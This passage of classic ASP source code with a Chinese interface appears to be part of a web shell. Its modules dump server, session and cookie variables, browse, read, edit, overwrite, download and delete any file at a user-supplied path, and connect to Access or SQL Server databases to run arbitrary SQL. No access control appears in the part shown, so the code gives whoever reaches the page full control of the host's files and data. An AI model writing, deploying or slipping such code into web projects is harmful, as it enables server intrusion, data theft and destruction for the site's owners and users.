			theObj(1) = theObj(0) & IIf(theObj(1) <> "", " <font color=#666666>(" & theObj(1) & ")</font>", "")
			Echo "<tr>"
			Echo "<td>&nbsp;" & theObj(1) & "</td>"
			Echo "<td align=center>" & theObj(2) & "</td>"
			Echo "<td align=center>" & theObj(3) & "</td>"
			Echo "</tr>"
		Next
		Echo "<form method=post action='" & url & "'>"
		Echo "<input type=hidden name=PageName value=PageCheck><input type=hidden name=theAct id=theAct>"
		Echo "<tr>"
		Echo "<td colspan=3>&nbsp;其它组件检测:"
		Echo "<input name=TheObj type=text id=TheObj style='width:585px;' value=""" & strObj & """>"
		Echo "<input type=submit name=Submit value=提交></td>"
		Echo "</tr>"
		Echo "</form>"
		Echo Replace(sFooter, "=2", "=3")
	End Sub

	Sub PageCSInfo()
		If isDebugMode = False Then On Error Resume Next
		Dim sKey, sVar, sVariable
		
		ShowTitle("客户端服务器交互信息")
		
		Echo Replace(sHeader, "{$s}", "Application 变量查看")
		For Each sVariable In Application.Contents
			Echo "<tr><td valign=top style='width:130px;'>"
			Echo "&nbsp;<span class=fixSpan style='width:130px;' title='" & sVariable & "'>" & sVariable & "</span>"
			Echo "</td><td style='padding-left:7px;' class=fixTable><span>"
			If IsArray(Application(sVariable)) = True Then
				For Each sVar In Application(sVariable)
					Echo "<div>" & StrEncode(sVar) & "</div>"
				Next
			 Else
				Echo StrEncode(Application(sVariable))
			End If
			Echo "</span></td></tr>"
		Next
		Echo sFooter

		Echo "<br />" & Replace(sHeader, "{$s}", "Session 变量查看")
		For Each sVariable In Session.Contents
			Echo "<tr><td valign=top style='width:130px;'>"
			Echo "&nbsp;<span class=fixSpan style='width:130px;' title='" & sVariable & "'>" & sVariable & "</span>"
			Echo "</td><td style='padding-left:7px;' class=fixTable><span>"
			Echo StrEncode(Session(sVariable))
			Echo "</span></td></tr>"
		Next
		Echo sFooter
		
		Echo "<br />" & Replace(sHeader, "{$s}", "Cookies 变量查看")
		For Each sVariable In Request.Cookies
			If Request.Cookies(sVariable).HasKeys Then
				For Each sKey In Request.Cookies(sVariable)
					Echo "<tr><td valign=top style='width:130px;'>"
					Echo "&nbsp;<span class=fixSpan style='width:130px;' title='" & sVariable & "'>" & sVariable & "(" & sKey & ")</span>"
					Echo "</td><td style='padding-left:7px;' class=fixTable><span>"
					Echo StrEncode(Request.Cookies(sVariable)(sKey))
					Echo "</span></td></tr>"
				Next
			 Else
				Echo "<tr><td valign=top style='width:130px;'>&nbsp;<span class=fixSpan style='width:130px;' title='" & sVariable & "'>" & sVariable & "</span></td><td style='padding-left:7px;'>" & StrEncode(Request.Cookies(sVariable)) & "</td></tr>"
			End If
		Next
		Echo sFooter
		
		Echo "<br />" & Replace(sHeader, "{$s}", "ServerVariables 变量查看")
		For Each sVariable In Request.ServerVariables
			Echo "<tr><td>&nbsp;" & sVariable & ":</td><td style='padding-left:7px;' class=fixTable>" & StrEncode(Request.ServerVariables(sVariable)) & "</li>"
		Next
		Echo sFooter
	End Sub

	Sub PageFso()
		ShowTitle("FSO文件浏览操作器")
		
		Select Case theAct
			Case "rename"
				RenOne()
			Case "download"
				DownTheFile()
				Response.End()
			Case "del"
				DelOne()
			Case "newone"
				NewOne()
			Case "saveas"
				SaveAs()
			Case "save"
				SaveToFile()
				ShowEdit()
				Response.End()
			Case "showedit"
				ShowEdit()
				Response.End()
			Case "showimage"
				ShowImage()
				Response.End()
			Case "copy", "move"
				MoveCopyOne()
		End Select
		
		If theAct <> "" Then thePath = GetPost("truePath")
		
		FsoFileExplorer()
	End Sub

	Sub FsoFileExplorer()
		Dim objX, theFolder, folderId, extName, parentFolderName
		Dim strPath
		If isDebugMode = False Then On Error Resume Next
		If thePath = "" Then thePath = rootPath
		strPath = thePath
		
		If oFso.FolderExists(strPath) = False Then
			ShowErr(thePath & " 目录不存在或者不允许访问!")
		End If
		
		Set theFolder = oFso.GetFolder(strPath)
		parentFolderName = oFso.GetParentFolderName(strPath) & "\"
		
		Echo "<form method=post action='" & url & "'>"
		Echo Replace(sHeader, "{$s}", "FSO文件浏览操作器")
		Echo "<td colspan=2>&nbsp;"
		Echo "路径: <input style='width:500px;' name=thePath value=""" & HtmlEncode(thePath) & """>"
		Echo "<input type=hidden name=truePath value=""" & HtmlEncode(thePath) & """>"
		Echo " <input type=button value='提交' onclick=Command('submit');>"
		Echo " <input type=button value=上传 onclick=Command('upload')>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr><td colspan=2 class=trHead>&nbsp;</td></tr>"
		Echo "<tr><td valign=top>"
		Echo "<input type=hidden name=theAct>"
		Echo "<input type=hidden name=param>"
		Echo "<input type=hidden value=PageFso name=PageName>"
		Echo "<table width='99%' align=center>"
		Echo "<tr><td colspan=4 class=trHead>&nbsp;</td></tr><tr class=td><td>"

		If parentFolderName <> "\" Then
			folderId = Replace(parentFolderName, "\", "\\")
			Echo "&nbsp;<a href=""javascript:changeThePath(&#34;" & folderId & "&#34;);"">↑回上级目录</a>"
		End If
		Echo "</td><td align=center width=80>大小</td>"
		Echo "<td align=center width=140>最后修改</td><td align=center>操作</td></tr>"

		For Each objX In theFolder.SubFolders
			folderId = Replace(objX.Path, "\", "\\")
			Echo "<tr title=""" & objX.Name & """><td>&nbsp;<font color=CCCCFF>■</font>"
			Echo "<span class=fixSpan style='width:180;'>"
			Echo "<a href=""javascript:changeThePath(&#34;" & folderId & "&#34;);"">"& objX.Name & "</a></span>"
			Echo "</td>"
			Echo "<td align=center>-</td>"
			Echo "<td align=center>" & objX.DateLastModified & "</td><td>"
			Echo "<input type=checkbox name=checkBox value=""" & objX.Name & """>"
			Echo "<input type=button onclick=""Command('rename',&#34;" & objX.Name & "&#34;);"" value='Ren' title=重命名>"
			Echo "<input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&#34;" & Replace(objX.Path, "\", "\\") & "&#34;)"">"
			Echo "</td></tr>"
		Next
		For Each objX In theFolder.Files
			If Left(objX.Path, Len(rootPath)) <> rootPath Then
				folderId = ""
			 Else
				folderId = Replace(Replace(UrlEncode(Mid(objX.Path, Len(rootPath) + 1)), "%2E", "."), "+", "%20")
			End If
			Echo "<tr title=""" & objX.Name & """><td>&nbsp;<font color=CCCCFF>□</font>"
			Echo "<span class=fixSpan style='width:180;'>"
			If folderId = "" Then
				Echo objX.Name
			 Else
				Echo "<a href='" & Replace(folderId, "%5C", "/") & "' target=_blank>" & objX.Name & "</a>"
			End If
			Echo "</span></td><td align=center>" & GetTheSize(objX.Size) & "</td>"
			Echo "<td align=center>" & objX.DateLastModified & "</td><td>"
			Echo "<input type=checkbox name=checkBox value=""" & objX.Name & """>"
			
			extName = LCase(oFso.GetExtensionName(objX.Path))
			If InStr(editableFileExt, "$" & extName & "$") > 0 Then
				Echo "<input type=button value='Edit' title=编辑 onclick=""Command('showedit',&#34;" & objX.Name & "&#34;);"">"
			End If
			If InStr(imageFileExt, "$" & extName & "$") > 0 Then
				Echo "<input type=button value='View' title=查看图片 onclick=""Command('showimage',&#34;" & objX.Name & "&#34;);"">"
			End If
			If extName = "mdb" Then
				Echo "<input type=button value='Access' title=数据库操作 onclick=Command('access',""" & objX.Name & """)>"
			End If
			Echo "<input type=button value='D' title=下载 onclick=""Command('download',&#34;" & objX.Name & "&#34;)"">"
			Echo "<input type=button value='Ren' title=重命名 onclick=""Command('rename',&#34;" & objX.Name & "&#34;)"">"
			Echo "<input type=button value='S' title=另存为 onclick=""Command('saveas',&#34;" & Replace(objX.Path, "\", "\\") & "&#34;)"">"
			Echo "</td></tr>"
		Next
		Echo "<tr class=td><td colspan=3></td>"
		Echo "<td><input type=checkbox name=checkAll onclick=checkAllBox(this);>"
		Echo "<input type=button value='Delete' onclick=Command('del')>"
		Echo "<input type=button value='Pack' title=打包选中文件(夹) onclick=Command('pack')>"
		Echo "</td></tr></table>"
		Echo "</td><td width='20%' valign=top align=center>"
		Echo "<input type=button value=刷新 onclick=this.form.thePath.value=this.form.truePath.value;Command('submit');><br/>"
		Echo "<input type=button value=新建文件 onclick=Command('newone','file')><br/>"
		Echo "<input type=button value=新建文件夹 onclick=Command('newone','folder')><hr style='color:#d8d8f0;'/>"
		Echo "移动选中文件(夹)到<br/><input value=""" & HtmlEncode(thePath) & """ name=MoveTo><br/><input type=button value='移动' onclick=Command('move');><hr style='color:#d8d8f0;'/>"
		Echo "复制选中文件(夹)到<br/><input value=""" & HtmlEncode(thePath) & """ name=CopyTo><br/><input type=button value='复制' onclick=Command('copy');><hr style='color:#d8d8f0;'/>"
		Echo "</td></tr>"
		Echo sFooter
		Echo "</form>"
		
		Set theFolder = Nothing
	End Sub
	
	Sub RenOne()
		Dim objX, strPath, aryParam, isFile, isFolder
		If isDebugMode = False Then On Error Resume Next
		aryParam = Split(GetPost("param"), ",")
		strPath = GetPost("truePath") & "\"
		aryParam(0) = strPath & aryParam(0)
		isFile = oFso.FileExists(aryParam(0))
		isFolder = oFso.FolderExists(aryParam(0))

		If isFile = False And isFolder = False Then
			ShowErr("文件(夹)不存在或者不允许访问!")
		End If

		If isFile = False Then
			Set objX = oFso.GetFolder(aryParam(0))
			objX.Name = aryParam(1)
		 Else
			Set objX = oFso.GetFile(aryParam(0))
			objX.Name = aryParam(1)
		End If
		Set objX = Nothing

		ChkErr(Err)
	End Sub
	
	Sub DownTheFile()
		Response.Clear
		Dim oStream, strPath
		If isDebugMode = False Then On Error Resume Next
		strPath = GetPost("truePath") & "\" & GetPost("param")
		Set oStream = Server.CreateObject("adodb.stream")
		oStream.Open
		oStream.Type = 1
		oStream.LoadFromFile(strPath)
		ChkErr(Err)
		Response.AddHeader "Content-Disposition", "Attachment; Filename=" & GetPost("param")
		Response.AddHeader "Content-Length", oStream.Size
		Response.Charset = "UTF-8"
		Response.ContentType = "Application/Octet-Stream"
		Response.BinaryWrite oStream.Read 
		Response.Flush
		oStream.Close
		Set oStream = Nothing
	End Sub
	
	Sub DelOne()
		Dim objX, strPath
		If isDebugMode = False Then On Error Resume Next
		strPath = GetPost("truePath") & "\"
		For Each objX In Request.Form("checkBox")
			If oFso.FolderExists(strPath & objX) = True Then
				Call oFso.DeleteFolder(strPath & objX, True)
				ChkErr(Err)
			Else
				If oFso.FileExists(strPath & objX) = True Then
					Call oFso.DeleteFile(strPath & objX, True)
					ChkErr(Err)
				End If
			End If
		Next
	End Sub

	Sub MoveCopyOne()
		Dim objX, strPath, strMoveTo, strCopyTo
		If isDebugMode = False Then On Error Resume Next
		strMoveTo = GetPost("MoveTo")
		strCopyTo = GetPost("CopyTo")
		strPath = GetPost("truePath") & "\"
		If theAct = "move" Then
			strMoveTo = strMoveTo & "\"
		 Else
			strCopyTo = strCopyTo & "\"
		End If

		For Each objX In Request.Form("checkBox")
			If theAct = "move" Then
				If InStr(strMoveTo, strPath & objX) > 0 Then
					ShowErr("目标文件夹不能在源文件夹内")
				End If
				If oFso.FileExists(strPath & objX) = True Then
					Call oFso.MoveFile(strPath & objX, strMoveTo & objX)
				 Else
					Call oFso.MoveFolder(strPath & objX, strMoveTo & objX)
				End If
			 Else
				If InStr(strCopyTo, strPath & objX) > 0 Then
					ShowErr("目标文件夹不能在源文件夹内")
				End If
				If oFso.FileExists(strPath & objX) = True Then
					Call oFso.CopyFile(strPath & objX, strCopyTo & objX)
				 Else
					Call oFso.CopyFolder(strPath & objX, strCopyTo & objX)
				End If
			End If
			ChkErr(Err)
		Next
	End Sub

	Sub NewOne()
		Dim objX, strPath, aryParam
		If isDebugMode = False Then On Error Resume Next
		aryParam = Split(GetPost("param"), ",")
		strPath = GetPost("truePath") & "\" & aryParam(0)

		If aryParam(1) = "file" Then
			Call oFso.CreateTextFile(strPath, False)
		 Else
			oFso.CreateFolder(strPath)
		End If
	End Sub
	
	Sub ShowEdit()
		Dim theFile, strPath
		If isDebugMode = False Then On Error Resume Next
		strPath = GetPost("truePath") & "\" & GetPost("param")
		If Right(strPath, 1) = "\" Then strPath = Left(strPath, Len(strPath) - 1)
		Set theFile = oFso.OpenTextFile(strPath, 1, False)
		ChkErr(Err)

		Echo "<form method=post action=" & url & ">"
		Echo Replace(Replace(sHeader, "{$s}", "FSO文本编辑器"), "=2", "=1")
		Echo "<input type=hidden name=theAct>"
		Echo "<input type=hidden value=PageFso name=PageName>"
		Echo "<tr>"
		Echo "<td height=22>&nbsp;<input name=truePath value=""" & strPath & """ style=width:500px;>"
		Echo "<input type=submit value=查看 onClick=this.form.theAct.value='showedit';></td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td>&nbsp;<textarea name=fileContent style='width:735px;height:500px;'>"
		Echo HtmlEncode(theFile.ReadAll())
		Echo "</textarea></td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=td align=center><input type=button name=Submit value=保存 onClick=""if(confirm('确认保存修改?')){this.form.theAct.value='save';this.form.submit();}"">"
		Echo "<input type=reset value=重置><input type=button onclick='window.close();' value=关闭>"
		Echo "<input type=button value=预览 onclick=preView('1'); title='以HTML方式在新窗口中预览当前代码'></td>"
		Echo "</tr>"
		Echo "</form>"
		Echo "</table>"

		Set theFile = Nothing
	End Sub
	
	Sub SaveToFile()
		Dim theFile, strPath, fileContent
		If isDebugMode = False Then On Error Resume Next
		fileContent = GetPost("fileContent")
		strPath = GetPost("truePath")

		Set theFile = oFso.OpenTextFile(strPath, 2, True)
		theFile.Write fileContent
		theFile.Close
		ChkErr(Err)
		
		Set theFile = Nothing
	End Sub
	
	Sub SaveAs()
		Dim strPath, aryParam, isFile
		If isDebugMode = False Then On Error Resume Next
		aryParam = Split(GetPost("param"), ",")
		aryParam(0) = aryParam(0)
		aryParam(1) = aryParam(1)
		isFile = oFso.FileExists(aryParam(0))
		
		If isFile = True Then
			oFso.CopyFile aryParam(0), aryParam(1), False
		 Else
			oFso.CopyFolder aryParam(0), aryParam(1), False
		End If
		
		ChkErr(Err)
	End Sub

	Sub ShowImage()
		Dim stream, strPath, fileContentType
		If isDebugMode = False Then On Error Resume Next
		strPath = GetPost("truePath") & "\" & GetPost("param")

		Set stream = Server.CreateObject("adodb.stream")
		stream.Open
		stream.Type = 1
		stream.LoadFromFile(strPath)
		ChkErr(Err)
		Response.Clear
		Response.BinaryWrite stream.Read 
		stream.Close

		Set stream = Nothing
	End Sub

	Sub PageDBTool()
		ShowTitle("Access + SQL Server 数据库操作")
		Echo "<form method=post action=""" & url & """>"

		If theAct <> "" And theAct <> "Query" And theAct <> "ShowTables" Then
			SqlShowEdit()
			Echo "</form>"
			Response.End()
		End If

		ShowDBTool()
		
		Select Case theAct
			Case "Query"
				ShowQuery()
			Case "ShowTables"
				ShowTables()
		End Select
		
		Echo "</form>"
	End Sub

	Sub ShowDBTool()
		Echo "<input type=hidden value=PageDBTool name=PageName>"
		Echo "<input type=hidden name=theAct>"
		Echo "<input type=hidden name=param>"

		Echo Replace(sHeader, "{$s}", "Access + SQL Server 数据库操作")
		Echo "<tr>"
		Echo "<td height=50 align=center colspan=2>"
		Echo "<select onchange=""this.form.thePath.value=this.value;this.value='';""><option value=''>模板选择"
		Echo "<option value='DataSource;UserName;PassWord;'>MDB(1)"
		Echo "<option value='sql:Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & rootPath & "\db.mdb'>MDB(2)"
		Echo "<option value='sql:Provider=SQLOLEDB.1;Server=(local);User ID=UserName;Password=***;Database=Pubs;'>SQL Server"
		Echo "<option value='sql:Dsn=DsnName;'>数据源"
		Echo "</select> "
		Echo "<input name=thePath type=text id=thePath value=""" & HtmlEncode(thePath) & """ size=60>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td align=center class=td>"
		Echo "<input type=submit name=Submit value='提 交' onclick=""this.form.theAct.value='ShowTables';"">"
		Echo "<input type=reset value='重 置'> "
		Echo "</td>"
		Echo "</tr>"
		Echo "</table>"
	End Sub

	Sub ShowTables()
		Dim Cat, objTable, objColumn, intColSpan, objSchema
		If isDebugMode = False Then On Error Resume Next

		Echo sSqlSelect & "<textarea name=sql rows=1 style='width:647px;'></textarea>"
		Echo " <input type=button value=执行查询 onclick=""this.form.theAct.value='ShowQuery';Command('Query','0');"">"
		Echo "<input type=button value=- onclick='if(this.form.sql.rows>3)this.form.sql.rows-=3;'>"
		Echo "<input type=button value=+ onclick='this.form.sql.rows+=3;'>"
		Echo "<br/>"

		Echo Replace(sHeader, "{$s}", "数据表及结构查看")
		
		CreateConn()
		Set Cat = Server.CreateObject("ADOX.Catalog")
		Cat.ActiveConnection = conn.ConnectionString
		Echo "<tr><td width='20%' valign=top>"
		For Each objTable In Cat.Tables
			Echo "<span class=fixSpan title='" & objTable.Name & "' onclick=""Command('Query',this.title);this.disabled=true;"" "
			Echo "style='width:94%;padding-left:8px;cursor:hand;'>" & objTable.Name & "</span>"
		Next
		Echo "</td><td>"
		intColSpan = IIf(isSqlServer = True, "4", "6")
		
		For Each objTable In Cat.Tables
			Echo "<table width=98% align=center>"
			Echo "<tr>"
			Echo "<td class=trHead colspan=" & intColSpan & ">&nbsp;</td>"
			Echo "</tr>"
			Echo "<tr>"
			Echo "<td colspan=" & intColSpan & " class=td>&nbsp;<strong>"
			Echo objTable.Name & "</strong></td>"
			Echo "</tr>"
			
			Echo "<tr align=center>"
			Echo "<td align=left width=*>&nbsp;列名</td>"
			Echo "<td width=80>类型</td>"
			Echo "<td width=60>大小</td>"
			Echo "<td width=60>可否为空</td>"
			If isSqlServer = False Then
				Echo "<td width=50>默认值</td>"
				Echo "<td width=100>描述</td>"
			End If
			Echo "</tr>"
			
			For Each objColumn In Cat.Tables(objTable.Name).Columns
				Echo "<tr align=center>"
				Echo "<td align=left><span style='width:98%;padding-left:5px;'>" & objColumn.Name & "</a></td>"
				Echo "<td>" & GetDataType(objColumn.Type) & "</td>"
				If objColumn.DefinedSize <> 0 Then
					Echo "<td>" & objColumn.DefinedSize & "</td>"
				 Else
					Echo "<td>" & IIf(objColumn.Precision <> 0, objColumn.Precision, "&nbsp;") & "</td>"
				End If
				Echo "<td>" & IIf(objColumn.Attributes = 1, "False", "True") & "</td>"
				If isSqlServer = False Then
					Echo "<td><span class=fixSpan style='width:40px;padding-left:5px;' title=""" & HtmlEncode(objColumn.Properties("Default").value) & """>"
					Echo HtmlEncode(objColumn.Properties("Default").value) & "</span></td>"
					Echo "<td align=left><span class=fixSpan style='width:95px;padding-left:5px;' title=""" & objColumn.Properties("Description") & """>"
					Echo objColumn.Properties("Description") & "</span></td>"
				End If
				Echo "</tr>"
			Next

			Echo "<tr>"
			Echo "<td colspan=" & intColSpan & " class=td>&nbsp;</td>"
			Echo "</tr>"
			Echo "</table><br/>"
		Next

		Echo "</td>"
		Echo "</tr>"

		Echo sFooter
		
		Set Cat = Nothing
		DestoryConn()
	End Sub

	Sub ShowQuery()
		Dim i, j, x, rs, sql, sqlB, sqlC, Cat, intPage, objTable, strParam, strTable, strPrimaryKey, sExec
		If isDebugMode = False Then On Error Resume Next
		sql = GetPost("sql")
		strParam = GetPost("param")
		strTable = GetPost("theTable")
		Set rs = Server.CreateObject("Adodb.RecordSet")

		If IsNumeric(strParam) = True Then
			intPage = strParam
		 Else
			intPage = 1
			strTable = strParam
			sql = ""
		End If
		If sql = "" Then
			sql = "Select * From [" & strTable & "]"
		End If

		For i = 1 To Request.Form("KeyWord").Count
			If Request.Form("KeyWord")(i) <> "" Then
				sqlC = Replace(Request.Form("KeyWord")(i), "'", "''")
				sqlC = IIf(Request.Form("JoinTag")(i) = " like ", "'" & sqlC & "'", sqlC)
				sqlB = sqlB & "[" & Request.Form("Fields")(i) & "]" & Request.Form("JoinTag")(i) & sqlC & Request.Form("JoinTag2")(i)
			End If
		Next
		If sqlB <> "" Then
			sql = "Select * From [" & strTable & "] Where " & sqlB
			If Right(sql, 4) = " Or " Then sql = Left(sql, Len(sql) - 4)
			If Right(sql, 5) = " And " Then sql = Left(sql, Len(sql) - 5)
		End If

		Echo sSqlSelect & "<input type=hidden name=sql value=""" & HtmlEncode(sql) & """>"
		Echo "<textarea name=sqlB rows=1 style='width:647px;'>" & HtmlEncode(sql) & "</textarea>"
		Echo " <input type=button value=执行查询 onclick=""this.form.sql.value=this.form.sqlB.value;Command('Query','0');"">"
		Echo "<input type=button value=- onclick='if(this.form.sqlB.rows>3)this.form.sqlB.rows-=3;'>"
		Echo "<input type=button value=+ onclick='this.form.sqlB.rows+=3;'>"
		Echo "<input type=hidden name=theTable value=""" & HtmlEncode(strTable) & """>"
		Echo "<br/>"
		
		Echo Replace(sHeader, "{$s}", "SQL查询器")

		CreateConn()
		Set Cat = Server.CreateObject("ADOX.Catalog")
		Cat.ActiveConnection = conn.ConnectionString
		Echo "<tr><td width='20%' valign=top>"
		For Each objTable In Cat.Tables
			Echo "<span class=fixSpan title='" & objTable.Name & "' onclick=""Command('Query',this.title);this.disabled=true;"" "
			Echo "style='width:94%;padding-left:8px;cursor:hand;'>"
			If strTable = objTable.Name Then
				Echo "<u>" & objTable.Name & "</u>"
			 Else
				Echo objTable.Name
			End If
			Echo "</span>"
		Next
		Echo "</td><td valign=top>"

		If LCase(Left(sql, 7)) = "select " Then
			rs.Open sql, conn, 1, 1
			ChkErr(Err)
			rs.PageSize = PageSize
			If Not rs.Eof Then
				rs.AbsolutePage = intPage
			End If
	
			Echo "<div align=left><table border=1 width=490>"
			Echo "<tr>"
			Echo "<td height=22 class=trHead>&nbsp;</td>"
			Echo "</tr>"
			Echo "<tr>"
			Echo "<td height=22 class=td width=100>&nbsp;查询</td>"
			Echo "</tr><tr><td align=center>"
			Echo "<div><select name=Fields>"
			For Each x In rs.Fields
				Echo "<option value=""" & x.Name & """>" & x.Name & "</option>"
			Next
			Echo "</select>"
			Echo "<select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select>"
			Echo "<input name=KeyWord style='width:200px;'>"
			Echo "<select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> "
			Echo "<input type=button value=+ onclick=""this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>';"">"
			Echo "<input type=button value=- onclick=""this.parentElement.outerHTML='';""></div> "
			Echo "<input type=button value=查询 onclick=this.form.sql.value='';this.form.param.value='1';this.form.theAct.value='Query';this.form.submit();>"
			Echo "</td></tr>"
			Echo "<tr><td class=td>&nbsp;</td></tr>"
			Echo "</table></div><br/>"
			
			If rs.Fields.Count > 0 Then
				strPrimaryKey = GetPrimaryKey(strTable)
	
				Echo "<table border=1 align=left cellpadding=0 cellspacing=0>"
				Echo "<tr>"
				Echo "<td height=22 class=trHead colspan=" & rs.Fields.Count + 1 & ">&nbsp;</td>"
				Echo "</tr>"
				Echo "<tr>"
				Echo "<td height=22 class=td width=100 align=center>操作</td>"
				For j = 0 To rs.Fields.Count - 1
					Echo "<td height=22 class=td width=130><span class=fixSpan title='" & rs.Fields(j).Name & "' style='width:125px;padding-left:5px;'>" & rs.Fields(j).Name & "</span></td>"
				Next
				For i = 1 To rs.PageSize
					If rs.Eof Then Exit For
					Echo "</tr>"
					Echo "<tr valign=top>"
					Echo "<td height=22 align=center>"
					If strPrimaryKey <> "" Then
						Echo "<input type=button value=编辑 title='编辑/添加' onclick=showSqlEdit('" & strPrimaryKey & "','" & rs(strPrimaryKey) & "');>"
						Echo "<input type=button value=删除 onclick=sqlDelete('" & strPrimaryKey & "','" & rs(strPrimaryKey) & "');></td>"
					 Else
						Echo "<input type=button value=编辑 title='编辑/添加' onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');showSqlEdit('" & rs.Fields(0).Name & "','" & rs(rs.Fields(0).Name) & "');>"
						Echo "<input type=button value=删除 onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');sqlDelete('" & rs.Fields(0).Name & "','" & rs(rs.Fields(0).Name) & "');></td>"
					End If
					For j = 0 To rs.Fields.Count - 1
						Echo "<td height=22><span class=fixSpan style='width:125px;padding-left:5px;'>" & HtmlEncode(IIf(Len(rs(j)) > 50, Left(rs(j), 50), rs(j))) & "</span></td>"
					Next
					Echo "</tr>"
					rs.MoveNext
				Next
			End If
			Echo "<tr>"
			Echo "<td height=22 class=td colspan=" & rs.Fields.Count + 1 & ">"
			JavaScript("GetPageList(" & intPage & ", '" & rs.RecordCount & "','" & rs.PageCount & "', 10, '');")
			Echo "</td></tr></table>"
			rs.Close
		 Else
			Set rs = conn.Execute(sql, i, &H0001)
			ChkErr(Err)
			If rs.Fields.Count > 0 Then
				Echo "<table border=1 align=left cellpadding=0 cellspacing=0>"
				Echo "<tr>"
				Echo "<td height=22 class=trHead colspan=" & rs.Fields.Count & ">&nbsp;</td>"
				Echo "</tr><tr>"
				sExec = "<tr height=22>"
				For i = 0 To rs.Fields.Count - 1
					Echo "<td height=22 class=td style='padding-left:7px;'>" & rs.Fields(i).Name & "</td>"
					sExec = sExec & "<td style='padding:7px;'>{$" & i & "}</td>"
				Next
				sExec = sExec & "</tr>"
				Echo "</tr>"
				
				Do Until rs.EOF
					For i = 0 To rs.Fields.Count - 1
						sExec = Replace(sExec, "{$" & i & "}", StrEncode(rs(i)) & "<br />{$" & i & "}")
					Next
					rs.MoveNext
				Loop
				
				For i = 0 To rs.Fields.Count - 1
					sExec = Replace(sExec, "<br />{$" & i & "}", "")
				Next
				Echo sExec & "</table>"
			Else
				Echo "<script>alert('查询执行成功,按确定返回.\n刷新后可以看到执行效果.');history.back();</script>"
			End If
			Set rs = Nothing
			Set Cat = Nothing
			DestoryConn()
			Exit Sub
		End If

		Echo "</td>"
		Echo "</tr>"

		Echo sFooter
		
		Set rs = Nothing
		Set Cat = Nothing
		DestoryConn()
	End Sub

	Sub SqlShowEdit()
		Dim intFindI, intFindJ, intFindK, intFindL, intFindM, strJoinTag, multiTables, aParam
		Dim i, x, rs, sql, strTable, strExtra, strParam, intI, strColumn, strValue, strPrimaryKey
		If isDebugMode = False Then On Error Resume Next
		sql = GetPost("sql")
		strParam = GetPost("param")
		strTable = GetPost("theTable")
		intI = InStr(strParam, "!")
		intFindI = InStr(LCase(sql), " where")
		intFindJ = InStrRev(LCase(sql), "order ")
		intFindK = IIf(LCase(Right(sql, 4)) = "desc", "1", "0")
		strValue = Mid(strParam, intI + 1)
		strColumn = Left(strParam, intI - 1)
		strExtra = IIf(theAct = "next", ">", IIf(theAct = "pre", "<", ""))
		
		If intFindJ > 0 Then sql = Left(sql, intFindJ - 1)
		If intFindI > 0 Then
			strJoinTag = ") And "
			sql = Left(sql, intFindI + 5) & "(" & Mid(sql, intFindI + 6)
		 Else
			strJoinTag = " Where "
		End If
		If intFindK > 0 Then strExtra = IIf(strExtra = ">", "<", IIf(strExtra = "<", ">", ""))

		CreateConn()
		strPrimaryKey = GetPrimaryKey(strTable)
		Set rs = Server.CreateObject("Adodb.RecordSet")

		If strExtra <> "" And IsNumeric(strValue) = True Then
			sql = "Select Top 1" & Mid(sql, 7) & strJoinTag
			sql = sql & strColumn & " " & strExtra & " " & strValue & " Order By " & strColumn & IIf(strExtra = "<", " Desc", " Asc")
		 Else
			sql = sql & strJoinTag & strColumn & " like '" & Replace(strValue, "'", "''") & "'"
		End If

		intFindM = InStr(LCase(sql), "from")
		intFindI = InStr(LCase(sql), " where")
		intFindL = InStr(intFindM, LCase(sql), ",", 1)
		If intFindL > 0 Then
			If (intFindL > intFindM) And (intFindL < intFindI) Then
				multiTables = True
			End If
		End If
		
		If theAct = "dbdownfile" Then
			aParam = Split(strParam, "!")
			strValue = Replace(aParam(1) & "!" & aParam(2), "'", "''")
			sql = Replace(sql, strValue, Replace(aParam(1), "'", "''"))
			Set rs = conn.Execute(sql)
			DBDownTheFile(rs(aParam(2)))
			Set rs = Nothing
			Response.End()
		End If
		
		If theAct <> "edit" Then
			rs.Open sql, conn, 1, 3
			ChkErr(Err)
			If rs.Eof Then
				Echo "<script>alert('该记录不存在!');history.back();</script>"
				Response.End()
			End If

			If theAct = "new" Then rs.AddNew

			If theAct = "del" Then
				rs.Delete
				rs.Update
				AlertThenClose("删除成功!")
				Response.End
			 Else
				If theAct <> "pre" And theAct <> "next" Then
					For Each x In rs.Fields
						If strPrimaryKey <> x.Name Then
							rs(x.Name) = Request.Form(x.Name & "_Column")
						End If
					Next
					rs.Update
				End If
				strValue = rs(strColumn)
			End If

			If theAct = "new" Then
				sql = "Select * From [" & strTable & "] Where " & strColumn & " like '" & Replace(strValue, "'", "''") & "'"
			End If
			rs.Close
		End If

		rs.Open sql, conn, 1, 1

		Echo "<table border=1 width=600>"
		Echo "<tr>"
		Echo "<td height=22 class=trHead colspan=2>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td colspan=2 class=td><font face=webdings>8</font> SQL数据修改</td>"
		Echo "</tr>"
		Echo "<input type=hidden value=PageDBTool name=PageName>"
		Echo "<input type=hidden name=theAct value=save>"
		Echo "<input type=hidden name=sql value=""" & HtmlEncode(GetPost("sql")) & """>"
		Echo "<input type=hidden name=theTable value=""" & strTable & """>"
		Echo "<input type=hidden value=""" & HtmlEncode(strColumn & "!" & strValue) & """ name=param>"
		Echo "<input type=hidden value=""" & HtmlEncode(GetPost("thePath")) & """ name=thePath>"

		For Each x In rs.Fields
			Echo "<tr>"
			Echo "<td height=22 width=150>&nbsp;" & HtmlEncode(x.Name) & "<br/>&nbsp;(<em>" & GetDataType(x.Type) & "</em>)"
			If x.Type = 204 Or x.Type = 205 Then Echo "<input value='下载' type=button onclick=""Command('dbdownfile','" & x.Name & "')"" />"
			Echo "</td>"
			Echo "<td width=450>&nbsp;"
